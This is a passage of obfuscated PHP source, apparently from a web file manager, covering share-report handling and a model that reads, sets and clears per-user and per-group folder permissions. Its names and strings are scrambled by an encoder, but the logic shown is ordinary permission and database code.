unset($¾ÜöİŸ ); $íÒüÌûÀ = array_values($íÒüÌûÀ); } private function _makeOrder($¡Å–Â»ë = '') { $æîÛä•ß =& $_SERVER[É¨™èà]; $„ù…¸ÏÔ = array($æîÛä•ß[234], $æîÛä•ß[852], $æîÛä•ß[2166], $æîÛä•ß[2167]); $³Ìó¾‹À = array($æîÛä•ß[533] => $æîÛä•ß[534], $æîÛä•ß[535] => $æîÛä•ß[536]); $å“ğéÙ¡ = Input::get($æîÛä•ß[540], $æîÛä•ß[7], $æîÛä•ß[507], $„ù…¸ÏÔ); $Ğ°˜¯Ä¾ = Input::get($æîÛä•ß[541], $æîÛä•ß[7], $æîÛä•ß[2183], array($æîÛä•ß[2095], $æîÛä•ß[535])); $Ğ°˜¯Ä¾ = $³Ìó¾‹À[$Ğ°˜¯Ä¾]; $¡Å–Â»ë = $¡Å–Â»ë . "{$å“ğéÙ¡}\40{$Ğ°˜¯Ä¾}"; return $this->order($¡Å–Â»ë); } public function reportAdd($­ù”îî) { $—æÇ·Ê› =& $_SERVER[É¨™èà]; $»•íñåï = array($—æÇ·Ê›[680] => $­ù”îî[$—æÇ·Ê›[680]], $—æÇ·Ê›[1800] => USER_ID); if (Model($—æÇ·Ê›[2179])->where($»•íñåï)->find()) { return !1; } $Ö©ç ˆ = array($—æÇ·Ê›[680] => $­ù”îî[$—æÇ·Ê›[680]], $—æÇ·Ê›[1687] => $­ù”îî[$—æÇ·Ê›[1687]], $—æÇ·Ê›[194] => $­ù”îî[$—æÇ·Ê›[194]], $—æÇ·Ê›[553] => $­ù”îî[$—æÇ·Ê›[553]], $—æÇ·Ê›[1800] => USER_ID, $—æÇ·Ê›[33] => $­ù”îî[$—æÇ·Ê›[33]], $—æÇ·Ê›[536] => $­ù”îî[$—æÇ·Ê›[536]]); return Model($—æÇ·Ê›[2179])->add($Ö©ç ˆ); } public function reportList($©ã‚ë×) { $Œš€ˆÙø =& $_SERVER[É¨™èà]; $Ç´·í÷ø = array(); if ($©ã‚ë×[$Œš€ˆÙø[851]]) { $Ÿî®›Ô‚ = $©ã‚ë×[$Œš€ˆÙø[852]] ? $©ã‚ë×[$Œš€ˆÙø[852]] : strtotime(date($Œš€ˆÙø[2181])); $Ç´·í÷ø[$Œš€ˆÙø[234]] = array($Œš€ˆÙø[419], array($©ã‚ë×[$Œš€ˆÙø[851]], $Ÿî®›Ô‚)); } if (isset($©ã‚ë×[$Œš€ˆÙø[33]]) && in_array($©ã‚ë×[$Œš€ˆÙø[33]], array($Œš€ˆÙø[91], $Œš€ˆÙø[520], $Œš€ˆÙø[2184], $Œš€ˆÙø[2185], $Œš€ˆÙø[2186]))) { $Ç´·í÷ø[$Œš€ˆÙø[33]] = $©ã‚ë×[$Œš€ˆÙø[33]]; } if (isset($©ã‚ë×[$Œš€ˆÙø[840]]) && in_array($©ã‚ë×[$Œš€ˆÙø[840]], array($Œš€ˆÙø[231], $Œš€ˆÙø[91], $Œš€ˆÙø[520], $Œš€ˆÙø[2184]))) { $Ç´·í÷ø[$Œš€ˆÙø[840]] = $©ã‚ë×[$Œš€ˆÙø[840]]; } $åàò¶Ï™ = Input::get($Œš€ˆÙø[541], $Œš€ˆÙø[7], $Œš€ˆÙø[2183], array($Œš€ˆÙø[2095], $Œš€ˆÙø[535])); $Ö£š‡É¬ = array($Œš€ˆÙø[533] => $Œš€ˆÙø[534], $Œš€ˆÙø[535] => $Œš€ˆÙø[536]); $ÕªÖûÖæ = $Œš€ˆÙø[2187] . $Ö£š‡É¬[$åàò¶Ï™]; $ˆ¢ìÀÀ = Model($Œš€ˆÙø[2179])->where($Ç´·í÷ø)->order($ÕªÖûÖæ)->selectPage(20); if (empty($ˆ¢ìÀÀ[$Œš€ˆÙø[456]])) { return array(); } $¨€çÕ«Ù = array_to_keyvalue_group($ˆ¢ìÀÀ[$Œš€ˆÙø[456]], $Œš€ˆÙø[840], $Œš€ˆÙø[680]); if (!empty($¨€çÕ«Ù[0])) { $©ã‚ë× = $¨€çÕ«Ù[0]; $Ç´·í÷ø = array($Œš€ˆÙø[680] => array($Œš€ˆÙø[7], $©ã‚ë×)); $©”¯Åş = $this->where($Ç´·í÷ø)->field($Œš€ˆÙø[680])->select(); $©”¯Åş = array_to_keyvalue($©”¯Åş, $Œš€ˆÙø[12], $Œš€ˆÙø[680]); $ó×¦Ñí¶ = array_diff($©ã‚ë×, $©”¯Åş); if (!empty($ó×¦Ñí¶)) { foreach ($ˆ¢ìÀÀ[$Œš€ˆÙø[456]] as $Øêˆ‰ÖŒ => $Íï¦†Ş) { if (in_array($Íï¦†Ş[$Œš€ˆÙø[680]], $ó×¦Ñí¶)) { unset($ˆ¢ìÀÀ[$Œš€ˆÙø[456]][$Øêˆ‰ÖŒ]); } } } } $this->_listDataApply($ˆ¢ìÀÀ[$Œš€ˆÙø[456]]); return $ˆ¢ìÀÀ; } public function reportStatus($§‰ş§) { $š–ïâëŸ =& $_SERVER[É¨™èà]; $¬Æ„ö‡Ò = array($š–ïâëŸ[485] => $§‰ş§[$š–ïâëŸ[485]]); $ê«ˆò† = Model($š–ïâëŸ[2179])->where($¬Æ„ö‡Ò)->field($š–ïâëŸ[2188])->find(); if (!$ê«ˆò†) { return !1; } $©œŞ‘ú„ = array($š–ïâëŸ[840] => $§‰ş§[$š–ïâëŸ[840]]); if ($§‰ş§[$š–ïâëŸ[840]] == $š–ïâëŸ[2184] && $ê«ˆò†[$š–ïâëŸ[840]] == $š–ïâëŸ[2184]) { $©œŞ‘ú„[$š–ïâëŸ[840]] = 0; } $¢¾¨§ã = Model($š–ïâëŸ[2179])->where($¬Æ„ö‡Ò)->save($©œŞ‘ú„); if ($§‰ş§[$š–ïâëŸ[840]] == $š–ïâëŸ[520]) { if ($ê«ˆò†[$š–ïâëŸ[553]] != $š–ïâëŸ[231] && $this->shareFileMeta($ê«ˆò†[$š–ïâëŸ[553]])) { $this->shareFileMeta($ê«ˆò†[$š–ïâëŸ[553]], 0); } $this->remove($ê«ˆò†[$š–ïâëŸ[680]]); return !0; } if ($¢¾¨§ã && $§‰ş§[$š–ïâëŸ[840]] == $š–ïâëŸ[2184]) { $‹¯Á±ÂÁ = $©œŞ‘ú„[$š–ïâëŸ[840]] == $š–ïâëŸ[2184] ? 1 : 0; $this->shareFileMeta($ê«ˆò†[$š–ïâëŸ[553]], $‹¯Á±ÂÁ); $this->removeByFile($ê«ˆò†[$š–ïâëŸ[553]]); } return $¢¾¨§ã; } private function removeByFile($Òäô¤Í°) { $ÃŒ‰ìÇ° =& $_SERVER[É¨™èà]; $ßÔÁÒ = Model($ÃŒ‰ìÇ°[921])->where(array($ÃŒ‰ìÇ°[553] => $Òäô¤Í°))->field($ÃŒ‰ìÇ°[194])->select(); $³ÜŸüÇÊ = array_to_keyvalue($ßÔÁÒ, $ÃŒ‰ìÇ°[12], $ÃŒ‰ìÇ°[194]); $šâ‘à‰ = array($ÃŒ‰ìÇ°[194] => array($ÃŒ‰ìÇ°[7], $³ÜŸüÇÊ), $ÃŒ‰ìÇ°[574] => 1); $ßÔÁÒ = $this->where($šâ‘à‰)->field($ÃŒ‰ìÇ°[680])->select(); if (empty($ßÔÁÒ)) { return; } $©²ÏÁà¾ = array_to_keyvalue($ßÔÁÒ, $ÃŒ‰ìÇ°[12], $ÃŒ‰ìÇ°[680]); $this->remove($©²ÏÁà¾); } private function shareFileMeta($‰’ƒÛû, $´¬å……€ = null) { $–„”­•Ñ =& $_SERVER[É¨™èà]; $¸Ñ¡»Â™ = array($–„”­•Ñ[553] => $‰’ƒÛû, $–„”­•Ñ[97] => $–„”­•Ñ[2189]); if (is_null($´¬å……€)) { return Model($–„”­•Ñ[2190])->where($¸Ñ¡»Â™)->find(); } $¸Ñ¡»Â™[$–„”­•Ñ[461]] = $´¬å……€; Model($–„”­•Ñ[2190])->add($¸Ñ¡»Â™, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\x72\x63\145\x5f\141\x75\x74\150"; public function getAuth($°ÃØñäâ) { $àı¶–Ğ£ =& $_SERVER[É¨™èà]; $ÒĞŠç‚ = $this->sourceAuthSelect($°ÃØñäâ); $‘ú¢¸´Ø = array(); $Àâ“ô± = array(); $²Ì­÷ÓÏ = 2 << 25; foreach ($ÒĞŠç‚ as $¼úíÍÚŒ) { $øøòŒ…¹ = Model($àı¶–Ğ£[583])->listData($¼úíÍÚŒ[$àı¶–Ğ£[2108]]); if (!$øøòŒ…¹) { continue; } $‘ú¢¸´Ø[] = $¼úíÍÚŒ; $¤ÌÉöùª = 0; if ($¼úíÍÚŒ[$àı¶–Ğ£[191]] == SourceModel::TYPE_GROUP) { $¤ÌÉöùª = $²Ì­÷ÓÏ * 2; } if ($¼úíÍÚŒ[$àı¶–Ğ£[191]] == SourceModel::TYPE_USER) { $¤ÌÉöùª = $²Ì­÷ÓÏ; } if ($¼úíÍÚŒ[$àı¶–Ğ£[191]] == SourceModel::TYPE_USER && $¼úíÍÚŒ[$àı¶–Ğ£[581]] == $àı¶–Ğ£[231]) { $¤ÌÉöùª = 0; } $Àâ“ô±[] = $øøòŒ…¹[$àı¶–Ğ£[497]] + $¤ÌÉöùª; } array_multisort($Àâ“ô±, SORT_DESC, $‘ú¢¸´Ø); return $‘ú¢¸´Ø; } public function sourceAuthSelect($ÜÊÌİ›) { $ìç ÕÉÀ =& $_SERVER[É¨™èà]; static $À®œ§“ = array(); $«—¤‰èú = is_array($ÜÊÌİ›) ? !1 : !0; if ($«—¤‰èú) { $ÜÊÌİ› = array($ÜÊÌİ›); } $áøöÃ– = array(); foreach ($ÜÊÌİ› as $Â‡²í) { if (isset($À®œ§“[$Â‡²í])) { $áøöÃ–[$Â‡²í] = $À®œ§“[$Â‡²í]; } } if (count($áøöÃ–) == count($ÜÊÌİ›)) { return $«—¤‰èú ? $áøöÃ–[$ÜÊÌİ›[0]] : $áøöÃ–; } $Ìƒ¬õŠÛ = $ìç ÕÉÀ[2191]; $Ô›š÷“û = array($ìç ÕÉÀ[194] => array($ìç ÕÉÀ[7], $ÜÊÌİ›)); $óŒÚ‡±ö = $this->field($Ìƒ¬õŠÛ)->order($ìç ÕÉÀ[485])->where($Ô›š÷“û)->select(); $µåœÍ¬ü = array_to_keyvalue_group($óŒÚ‡±ö, $ìç ÕÉÀ[194]); foreach ($ÜÊÌİ› as $Â‡²í) { $À®œ§“[$Â‡²í] = $µåœÍ¬ü[$Â‡²í] ? $µåœÍ¬ü[$Â‡²í] : array(); } if ($«—¤‰èú) { return $óŒÚ‡±ö; } return $µåœÍ¬ü; } public function setAuth($³‡ĞÓã, $ÖòÔã„Ô) { $¯ıªÚª¸ =& $_SERVER[É¨™èà]; $“ª’à®® = Model($¯ıªÚª¸[1448])->sourceInfo($³‡ĞÓã); if (!$“ª’à®®) { return !1; } if ($“ª’à®®[$¯ıªÚª¸[191]] != SourceModel::TYPE_GROUP) { return !1; } $¨ü“ä¸î = 1; $ËøåÁü = $“ª’à®®[$¯ıªÚª¸[581]]; if ($ËøåÁü != $¨ü“ä¸î) { $œŸ¿¨Öí = array($¯ıªÚª¸[1410] => $ËøåÁü); $¨È”³ı¨ = Model($¯ıªÚª¸[2094])->field($¯ıªÚª¸[1800])->where($œŸ¿¨Öí)->select(); $¨È”³ı¨ = array_to_keyvalue($¨È”³ı¨, $¯ıªÚª¸[12], $¯ıªÚª¸[1800]); } $µŒ¯‘… = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ü¾Œ™˜ı = array(); foreach ($ÖòÔã„Ô as $Àäò×ë) { if (!in_array($Àäò×ë[$¯ıªÚª¸[191]], $µŒ¯‘…)) { show_json(LNG($¯ıªÚª¸[2192]), !1); } if ($ËøåÁü != $¨ü“ä¸î) { if ($Àäò×ë[$¯ıªÚª¸[191]] == SourceModel::TYPE_GROUP) { } if ($Àäò×ë[$¯ıªÚª¸[581]] != 0 && !in_array($Àäò×ë[$¯ıªÚª¸[581]], $¨È”³ı¨)) { } } if ($Àäò×ë[$¯ıªÚª¸[581]] == 0) { $Àäò×ë[$¯ıªÚª¸[191]] = SourceModel::TYPE_USER; } $ü¾Œ™˜ı[] = array($¯ıªÚª¸[194] => $³‡ĞÓã, $¯ıªÚª¸[191] => intval($Àäò×ë[$¯ıªÚª¸[191]]), $¯ıªÚª¸[581] => intval($Àäò×ë[$¯ıªÚª¸[581]]), $¯ıªÚª¸[2108] => intval($Àäò×ë[$¯ıªÚª¸[2108]]) ? intval($Àäò×ë[$¯ıªÚª¸[2108]]) : 0, $¯ıªÚª¸[2171] => intval($Àäò×ë[$¯ıªÚª¸[2171]]) ? intval($Àäò×ë[$¯ıªÚª¸[2171]]) : -1); } $this->where(array($¯ıªÚª¸[501] => $³‡ĞÓã))->delete(); $this->addAll($ü¾Œ™˜ı); return !0; } public function authClear($°ç¶„¿ş) { $œ”¨›ôÛ =& $_SERVER[É¨™èà]; $ÔÁ¹Óìú = Model($œ”¨›ôÛ[1448])->sourceInfo($°ç¶„¿ş); $È¬¸ÉÚ¬ = array($°ç¶„¿ş); if ($ÔÁ¹Óìú[$œ”¨›ôÛ[495]] == $œ”¨›ôÛ[91]) { $½ğ‚ã¾ò = array($œ”¨›ôÛ[667] => array($œ”¨›ôÛ[627], $ÔÁ¹Óìú[$œ”¨›ôÛ[596]] . $°ç¶„¿ş . $œ”¨›ôÛ[628])); $È¬¸ÉÚ¬ = Model($œ”¨›ôÛ[1448])->field($œ”¨›ôÛ[501])->where($½ğ‚ã¾ò)->getField($œ”¨›ôÛ[194], !0); $È¬¸ÉÚ¬[] = $°ç¶„¿ş; } $this->where(array($œ”¨›ôÛ[501] => array($œ”¨›ôÛ[502], $È¬¸ÉÚ¬)))->delete(); return !0; } public function getAllChildren($îãÀŠğõ) { $×¦Åî·µ =& $_SERVER[É¨™èà]; $¶ô“·é = Model($×¦Åî·µ[1448])->sourceInfo($îãÀŠğõ); if ($¶ô“·é[$×¦Åî·µ[495]] != $×¦Åî·µ[91]) { return $this->sourceListAuth(array($îãÀŠğõ)); } if ($¶ô“·é[$×¦Åî·µ[191]] != SourceModel::TYPE_GROUP) { return array(); } $Ì„»®ÑÛ = 1; $Èğ‰ç¹¶ = array($îãÀŠğõ); if ($¶ô“·é[$×¦Åî·µ[193]] == $×¦Åî·µ[231] && $¶ô“·é[$×¦Åî·µ[581]] != $Ì„»®ÑÛ) { $Èğ‰ç¹¶ = $this->groupChidldAllRootSource($¶ô“·é[$×¦Åî·µ[581]]); } $ÂÒ¸Ä§ˆ = $this->field($×¦Åî·µ[194])->group($×¦Åî·µ[194])->select(); $ÂÒ¸Ä§ˆ = array_to_keyvalue($ÂÒ¸Ä§ˆ, $×¦Åî·µ[12], $×¦Åî·µ[194]); if (!$ÂÒ¸Ä§ˆ) { return array(); } $ãıåÔ»¢ = $×¦Åî·µ[2193]; $¾¹¸ü¶ = array($×¦Åî·µ[194] => array($×¦Åî·µ[7], $ÂÒ¸Ä§ˆ), $×¦Åî·µ[515] => $×¦Åî·µ[231]); $Ô¿Ìã³ = Model($×¦Åî·µ[921])->field($ãıåÔ»¢)->where($¾¹¸ü¶)->select(); $ĞÆ¬«»ı = array($îãÀŠğõ); foreach ($Ô¿Ìã³ as $×Ë° ì±) { foreach ($Èğ‰ç¹¶ as $”å´éÅ²) { $¥••†Î§ = $×¦Åî·µ[50] . $”å´éÅ² . $×¦Åî·µ[50]; $¢ğûé½­ = $×Ë° ì±[$×¦Åî·µ[596]] . $×Ë° ì±[$×¦Åî·µ[194]] . $×¦Åî·µ[50]; if (strstr($¢ğûé½­, $¥••†Î§)) { $ĞÆ¬«»ı[] = $×Ë° ì±[$×¦Åî·µ[194]]; break; } } } return $this->sourceListAuth($ĞÆ¬«»ı); } private function sourceListAuth($˜ƒø‰–é) { $—¯ş©Ë =& $_SERVER[É¨™èà]; $…ËÒ©ûĞ = Model($—¯ş©Ë[1448])->sourceListInfo($˜ƒø‰–é, !0); $¿êß¿ıï = $this->sourceAuthSelect($˜ƒø‰–é); $Çƒ™œÚ¬ = array(); $²‹³» = array(); foreach ($…ËÒ©ûĞ as $ëùÊã²Ÿ) { unset($ëùÊã²Ÿ[$—¯ş©Ë[539]]); unset($ëùÊã²Ÿ[$—¯ş©Ë[537]]); unset($ëùÊã²Ÿ[$—¯ş©Ë[497]]); unset($ëùÊã²Ÿ[$—¯ş©Ë[90]]); $Æ÷’Ø¢ç = $¿êß¿ıï[$ëùÊã²Ÿ[$—¯ş©Ë[194]]]; if (!$Æ÷’Ø¢ç) { continue; } $ëùÊã²Ÿ[$—¯ş©Ë[2194]] = $this->authTargetInfo($Æ÷’Ø¢ç); $ëùÊã²Ÿ[$—¯ş©Ë[594]] = rtrim($ëùÊã²Ÿ[$—¯ş©Ë[600]], $—¯ş©Ë[8]) . $—¯ş©Ë[8] . ltrim($ëùÊã²Ÿ[$—¯ş©Ë[594]], $—¯ş©Ë[8]); $Çƒ™œÚ¬[] = $ëùÊã²Ÿ; $÷÷‡û… = count(explode($—¯ş©Ë[8], trim($ëùÊã²Ÿ[$—¯ş©Ë[594]], $—¯ş©Ë[8]))); $²‹³»[] = $÷÷‡û… + ($ëùÊã²Ÿ[$—¯ş©Ë[33]] == $—¯ş©Ë[78] ? 0 : 1000); } array_multisort($²‹³», SORT_ASC, $Çƒ™œÚ¬); return $Çƒ™œÚ¬; } private function groupChidldAllRootSource($±Ë¾ÑŒ¯) { $ãÊÎìø =& $_SERVER[É¨™èà]; $ôÃ‰ıÚ÷ = Model($ãÊÎìø[1408])->groupChildrenAll($±Ë¾ÑŒ¯); $„±²µ©å = array($ãÊÎìø[193] => 0, $ãÊÎìø[581] => array($ãÊÎìø[7], $ôÃ‰ıÚ÷), $ãÊÎìø[191] => SourceModel::TYPE_GROUP); $÷„®…ù­ = Model($ãÊÎìø[921])->field($ãÊÎìø[194])->where($„±²µ©å)->select(); $÷„®…ù­ = array_to_keyvalue($÷„®…ù­, $ãÊÎìø[12], $ãÊÎìø[194]); return $÷„®…ù­; } private function authTargetInfo($œ‚Œ¨ÅÈ) { $¡ÌâÒ»€ =& $_SERVER[É¨™èà]; $Š¿“†Å† = array(); $Œ‹áğ® = array(); $õÏ¼Ûí = 2 << 25; foreach ($œ‚Œ¨ÅÈ as $íıçÓî€) { $¨–£ÛÎé = Model($¡ÌâÒ»€[583])->listData($íıçÓî€[$¡ÌâÒ»€[2108]]); if (!$¨–£ÛÎé) { continue; } if ($íıçÓî€[$¡ÌâÒ»€[191]] == SourceModel::TYPE_USER) { $“âÎıÙ = Model($¡ÌâÒ»€[589])->getInfoSimpleOuter($íıçÓî€[$¡ÌâÒ»€[581]]); if ($“âÎıÙ[$¡ÌâÒ»€[1800]] == $¡ÌâÒ»€[1293]) { continue; } if ($“âÎıÙ[$¡ÌâÒ»€[1800]] == $¡ÌâÒ»€[231]) { $“âÎıÙ[$¡ÌâÒ»€[32]] = LNG($¡ÌâÒ»€[2195]); } } else { $“âÎıÙ = Model($¡ÌâÒ»€[597])->getInfoSimple($íıçÓî€[$¡ÌâÒ»€[581]]); } if (!$“âÎıÙ) { continue; } $“âÎıÙ[$¡ÌâÒ»€[552]] = $¨–£ÛÎé; $Š¿“†Å†[] = $“âÎıÙ; $Õƒ‡ó¨ô = 0; if ($íıçÓî€[$¡ÌâÒ»€[191]] == SourceModel::TYPE_GROUP) { $Õƒ‡ó¨ô = $õÏ¼Ûí * 2; } if ($íıçÓî€[$¡ÌâÒ»€[191]] == SourceModel::TYPE_USER) { $Õƒ‡ó¨ô = $õÏ¼Ûí; } if ($íıçÓî€[$¡ÌâÒ»€[191]] == SourceModel::TYPE_USER && $íıçÓî€[$¡ÌâÒ»€[581]] == $¡ÌâÒ»€[231]) { $Õƒ‡ó¨ô = 0; } $Œ‹áğ®[] = $¨–£ÛÎé[$¡ÌâÒ»€[497]] + $Õƒ‡ó¨ô; } array_multisort($Œ‹áğ®, SORT_DESC, $Š¿“†Å†); return $Š¿“†Å†; } public function getAllChildrenByUser($¾Ş¨ÛéÌ, $Ò¬š†) { $Ï²í…¸¦ =& $_SERVER[É¨™èà]; $Á¼ñÀå­ = Model($Ï²í…¸¦[609])->getInfo($Ò¬š†); if (!$Ò¬š† || !$¾Ş¨ÛéÌ || !$Á¼ñÀå­) { return array(); } $€°‹Ú = Model($Ï²í…¸¦[1448])->sourceInfo($¾Ş¨ÛéÌ); $ ªĞÓÛò = array(); $™Æş¦²¡ = 1; if ($€°‹Ú[$Ï²í…¸¦[193]] == $Ï²í…¸¦[231] && $€°‹Ú[$Ï²í…¸¦[581]] != $™Æş¦²¡ && $this->groupContainUser($€°‹Ú[$Ï²í…¸¦[581]], $Ò¬š†)) { foreach ($Á¼ñÀå­[$Ï²í…¸¦[1409]] as $‘š“öÕ) { $›Á¾®ì = Model($Ï²í…¸¦[597])->getInfo($‘š“öÕ[$Ï²í…¸¦[1410]]); $â”£¾°Ä = Model($Ï²í…¸¦[609])->getInfoSimpleOuter($Ò¬š†); $â”£¾°Ä[$Ï²í…¸¦[552]] = $‘š“öÕ[$Ï²í…¸¦[497]]; if (Model($Ï²í…¸¦[583])->authCheckAction($‘š“öÕ[$Ï²í…¸¦[497]][$Ï²í…¸¦[497]], $Ï²í…¸¦[2020])) { continue; } $ñïÖÁé = array($Ï²í…¸¦[32] => $Ï²í…¸¦[1313] . $›Á¾®ì[$Ï²í…¸¦[32]], $Ï²í…¸¦[194] => $›Á¾®ì[$Ï²í…¸¦[90]][$Ï²í…¸¦[194]], $Ï²í…¸¦[87] => KodIO::make($›Á¾®ì[$Ï²í…¸¦[90]][$Ï²í…¸¦[194]]), $Ï²í…¸¦[193] => $Ï²í…¸¦[231], $Ï²í…¸¦[191] => $Ï²í…¸¦[590], $Ï²í…¸¦[33] => $Ï²í…¸¦[631], $Ï²í…¸¦[594] => $›Á¾®ì[$Ï²í…¸¦[601]], $Ï²í…¸¦[1410] => $›Á¾®ì[$Ï²í…¸¦[1410]], $Ï²í…¸¦[598] => $›Á¾®ì[$Ï²í…¸¦[193]], $Ï²í…¸¦[2194] => array($â”£¾°Ä)); $ ªĞÓÛò[$ñïÖÁé[$Ï²í…¸¦[194]]] = $ñïÖÁé; } } $ñé‘ó»ó = array(); $…Ë¤İşö = $this->getAllChildren($¾Ş¨ÛéÌ); foreach ($…Ë¤İşö as $ÌÔšÇë´) { $Ğ¿¯’ò = !1; foreach ($ÌÔšÇë´[$Ï²í…¸¦[2194]] as $âÅÌ‹Õ) { if ($âÅÌ‹Õ[$Ï²í…¸¦[1800]]) { if ($âÅÌ‹Õ[$Ï²í…¸¦[1800]] == $Ò¬š†) { $Ğ¿¯’ò = !0; break; } } if ($âÅÌ‹Õ[$Ï²í…¸¦[1410]]) { if ($this->groupContainUser($âÅÌ‹Õ[$Ï²í…¸¦[1410]], $Ò¬š†)) { $Ğ¿¯’ò = !0; break; } } } if ($Ğ¿¯’ò) { $ñé‘ó»ó[] = $ÌÔšÇë´; } $å¯÷Æè— = $ÌÔšÇë´[$Ï²í…¸¦[194]]; if (isset($ ªĞÓÛò[$å¯÷Æè—])) { $ÌÔšÇë´[$Ï²í…¸¦[2194]][] = $ ªĞÓÛò[$å¯÷Æè—][0]; $ ªĞÓÛò[$å¯÷Æè—] = !1; } } $ ªĞÓÛò = array_filter(array_values($ ªĞÓÛò)); $ñé‘ó»ó = array_merge($ ªĞÓÛò, $ñé‘ó»ó); return $ñé‘ó»ó; } public function setAllChildrenByUser($çº—³üÅ, $®ñäÎË, $´æ²£½Í) { $ùšıü¸Ù =& $_SERVER[É¨™èà]; $í¡…íš = $this->getAllChildrenByUser($çº—³üÅ, $®ñäÎË); if (!$´æ²£½Í || !$í¡…íš) { return !1; } foreach ($í¡…íš as $ŸèˆÛßº) { $‚…•ƒîü = array(); foreach ($ŸèˆÛßº[$ùšıü¸Ù[2194]] as $Èè»®ÆÑ) { $ã¢È¦¼Œ = $Èè»®ÆÑ[$ùšıü¸Ù[552]]; $íÌ·Ô¬ü = $Èè»®ÆÑ[$ùšıü¸Ù[1800]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $†ó“¿µì = $Èè»®ÆÑ[$ùšıü¸Ù[1800]] ? $Èè»®ÆÑ[$ùšıü¸Ù[1800]] : $Èè»®ÆÑ[$ùšıü¸Ù[1410]]; if ($Èè»®ÆÑ[$ùšıü¸Ù[1800]] && $Èè»®ÆÑ[$ùšıü¸Ù[1800]] == $®ñäÎË) { continue; } $‚…•ƒîü[] = array($ùšıü¸Ù[194] => $ŸèˆÛßº[$ùšıü¸Ù[194]], $ùšıü¸Ù[191] => $íÌ·Ô¬ü, $ùšıü¸Ù[581] => intval($†ó“¿µì), $ùšıü¸Ù[2108] => isset($ã¢È¦¼Œ[$ùšıü¸Ù[485]]) ? intval($ã¢È¦¼Œ[$ùšıü¸Ù[485]]) : 0, $ùšıü¸Ù[2171] => isset($ã¢È¦¼Œ[$ùšıü¸Ù[2171]]) ? intval($ã¢È¦¼Œ[$ùšıü¸Ù[2171]]) : -1); } $‚…•ƒîü[] = array($ùšıü¸Ù[194] => $ŸèˆÛßº[$ùšıü¸Ù[194]], $ùšıü¸Ù[191] => SourceModel::TYPE_USER, $ùšıü¸Ù[581] => intval($®ñäÎË), $ùšıü¸Ù[2108] => intval($´æ²£½Í), $ùšıü¸Ù[2171] => -1); $this->where(array($ùšıü¸Ù[501] => $ŸèˆÛßº[$ùšıü¸Ù[194]]))->delete(); $this->addAll($‚…•ƒîü); } return !0; } public function get($ùÍ»“Ş) { $ü„€¸­÷ = $this->getSourceList(array($ùÍ»“Ş), !0); return $ü„€¸­÷[0]; } public function getSourceList($ÕÃ¹Ş, $°ÊÆŞ‡Ô = false, $¼šìÙ­ = false) { $«‹Üá‡ø =& $_SERVER[É¨™èà]; if (!$ÕÃ¹Ş) { return array(); } $ã§™¦œø = Model($«‹Üá‡ø[1448]); if (!$°ÊÆŞ‡Ô && count($ÕÃ¹Ş) == 1) { $°ÊÆŞ‡Ô = array(); $°ÊÆŞ‡Ô[$ÕÃ¹Ş[0]] = $ã§™¦œø->sourceInfo($ÕÃ¹Ş[0]); } if (!$°ÊÆŞ‡Ô) { $¾Ü¿ÌÛ = array($«‹Üá‡ø[501] => array($«‹Üá‡ø[502], $ÕÃ¹Ş)); $°ÊÆŞ‡Ô = $ã§™¦œø->field($«‹Üá‡ø[2196])->where($¾Ü¿ÌÛ)->select(); $°ÊÆŞ‡Ô = array_to_keyvalue($°ÊÆŞ‡Ô, $«‹Üá‡ø[194]); } $³îÚœ³È = $ÕÃ¹Ş; foreach ($°ÊÆŞ‡Ô as $Ù¢ëà => $Ãµºæƒ) { $ë†«ŸŸÇ = $ã§™¦œø->parentLevelArray($Ãµºæƒ[$«‹Üá‡ø[596]]); $³îÚœ³È = array_merge($³îÚœ³È, array($Ù¢ëà), array_reverse($ë†«ŸŸÇ)); } $³îÚœ³È = array_values(array_unique($³îÚœ³È)); if (!$³îÚœ³È) { return array(); } $›¥İ’Ö¯ = $this->sourceAuthSelect($³îÚœ³È); $øÑÎµş² = array(); foreach ($³îÚœ³È as $Ç‰ö«Ô) { if (isset($›¥İ’Ö¯[$Ç‰ö«Ô])) { $øÑÎµş²[$Ç‰ö«Ô] = $›¥İ’Ö¯[$Ç‰ö«Ô]; } } $Öü™¹— = $this->userIsRoot($¼šìÙ­); $õú„»Ó– = AuthModel::authAll(); $ãÃÕêš˜ = array($«‹Üá‡ø[498] => $õú„»Ó–, $«‹Üá‡ø[2197] => array($«‹Üá‡ø[503] => 0, $«‹Üá‡ø[2005] => $õú„»Ó–, $«‹Üá‡ø[504] => LNG($«‹Üá‡ø[2198]), $«‹Üá‡ø[2022] => $«‹Üá‡ø[2199])); $…Î’¥® = array(); foreach ($°ÊÆŞ‡Ô as $Ç‰ö«Ô => $â‹ÖØ†•) { if ($Öü™¹— && $GLOBALS[$«‹Üá‡ø[6]][$«‹Üá‡ø[2018]]) { $…Î’¥®[$Ç‰ö«Ô] = $ãÃÕêš˜; continue; } $…Î’¥®[$Ç‰ö«Ô] = $this->makeSourceAuth($â‹ÖØ†•, $øÑÎµş², $¼šìÙ­); } return $…Î’¥®; } public function authDeepCheck($êÓçô¨, $¯£›Ûß§ = false) { $Ç²„°Ï“ =& $_SERVER[É¨™èà]; $¯£›Ûß§ = $¯£›Ûß§ ? $¯£›Ûß§ : USER_ID; $˜Ù¬û = $this->makeAuthDeep($¯£›Ûß§); if (!in_array($êÓçô¨, $˜Ù¬û[$Ç²„°Ï“[2200]])) { return !1; } $¡‘·Ãê = array(); foreach ($˜Ù¬û[$Ç²„°Ï“[2201]] as $šÃÛ­Ìª => $éâá³·Ö) { if (!in_array($êÓçô¨, $éâá³·Ö)) { continue; } $¡‘·Ãê[] = $šÃÛ­Ìª; } if (!$¡‘·Ãê) { return !1; } $¸îãÖü§ = $¡‘·Ãê ? $¡‘·Ãê[0] : $êÓçô¨; return array($Ç²„°Ï“[498] => -1, $Ç²„°Ï“[552] => array($Ç²„°Ï“[503] => $Ç²„°Ï“[1293], $Ç²„°Ï“[2005] => $Ç²„°Ï“[231], $Ç²„°Ï“[504] => LNG($Ç²„°Ï“[2202]), $Ç²„°Ï“[2022] => $Ç²„°Ï“[2203]), $Ç²„°Ï“[2204] => LNG($Ç²„°Ï“[2205]), $Ç²„°Ï“[2206] => $this->sourceAuthInfo($¸îãÖü§)); } protected function makeAuthDeep($©á€ÌëÔ = false) { $Ÿ¸ç‡ı€ =& $_SERVER[É¨™èà]; static $Õçëâìƒ = array(); $©á€ÌëÔ = $©á€ÌëÔ ? $©á€ÌëÔ : USER_ID; if (isset($Õçëâìƒ[$©á€ÌëÔ])) { return 